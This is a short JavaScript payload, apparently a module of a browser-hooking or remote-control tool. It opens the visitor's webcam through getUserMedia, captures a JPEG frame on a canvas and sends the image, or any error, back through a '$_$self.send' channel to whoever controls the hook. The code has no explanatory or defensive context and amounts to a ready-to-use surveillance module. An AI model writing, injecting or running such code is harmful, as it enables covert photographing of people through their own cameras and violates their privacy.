if(!window.$_$takeSnap){
	var $_$self = this,
		$_$width = 1280,
		$_$height = 720,
		$_$wcsVideo = document.createElement('video'),
		$_$wcsCanvas = document.createElement('canvas'),
		$_$wcsCTX = $_$wcsCanvas.getContext('2d'),
		$_$playing = false,
		$_$wcsSuccess = false;

	$_$wcsVideo.width = $_$width;
	$_$wcsVideo.height = $_$height;
	$_$wcsCanvas.width = $_$width;
	$_$wcsCanvas.height = $_$height;

	window.$_$takeSnap = function(){
		if($_$wcsSuccess){
			var t = setInterval(function(){
				if(!$_$playing) return;
				$_$wcsCTX.drawImage($_$wcsVideo, 0, 0, $_$width, $_$height);
				var $_$dataURL = $_$wcsCanvas.toDataURL('image/jpeg');
				$_$self.send($_$dataURL);
				clearTimeout(t);
			}, 500);
		}
	};

	$_$wcsVideo.addEventListener('playing', function(){
		$_$playing = true;
	});

	navigator.mediaDevices.getUserMedia({video: true, audio: false})
	.then(function(stream){
		var u = window.URL || window.webkitURL;
		$_$wcsVideo.src = u.createObjectURL(stream);
		$_$wcsVideo.play();
		$_$wcsSuccess = true;
		window.$_$takeSnap();
	})
	.catch(function(e){
		$_$self.send(String(e));
	});
}else{
	window.$_$takeSnap();	
}
